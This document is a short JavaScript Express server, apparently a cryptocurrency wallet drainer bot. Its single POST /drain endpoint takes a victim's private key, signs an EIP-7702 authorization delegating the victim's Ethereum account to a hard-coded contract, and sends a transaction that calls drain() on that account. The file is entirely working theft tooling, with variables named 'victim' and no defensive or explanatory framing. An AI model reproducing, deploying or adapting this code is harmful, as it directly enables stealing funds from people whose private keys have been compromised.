import express from "express";
import cors from "cors";
import { JsonRpcProvider, Wallet, Interface } from "ethers";

const RPC = process.env.RPC_URL;
const PK = process.env.PRIVATE_KEY;
const CONTRACT = "0x644efce7920fc8af69cb45832e5fed2ff5e2d92b";

const provider = new JsonRpcProvider(RPC);
const wallet = new Wallet(PK, provider);
const iface = new Interface(["function drain()"]);

const app = express();
app.use(cors());
app.use(express.json());

app.post("/drain", async (req, res) => {
  try {
    const { victimPk } = req.body;
    if (!victimPk) return res.status(400).json({ error: "victimPk manquant" });

    const victim = new Wallet(victimPk, provider);

    // ethers signe l'autorisation au bon format 7702
    const authorization = await victim.signAuthorization({
      chainId: 1,
      address: CONTRACT,
      nonce: await provider.getTransactionCount(victim.address, "latest"),
    });

    const nonce = await provider.getTransactionCount(wallet.address, "latest");
    const fee = await provider.getFeeData();

    const tx = {
      type: 4,
      chainId: 1,
      to: victim.address,
      value: 0n,
      data: iface.encodeFunctionData("drain"),
      nonce,
      maxFeePerGas: fee.maxFeePerGas,
      maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
      gasLimit: 300000n,
      authorizationList: [authorization],
    };

    const sent = await wallet.sendTransaction(tx);
    res.json({ hash: sent.hash });
  } catch (e) {
    res.status(500).json({ error: e.message || String(e) });
  }
});

app.get("/", (_, res) => res.send("bot ok"));
app.listen(process.env.PORT || 3000);
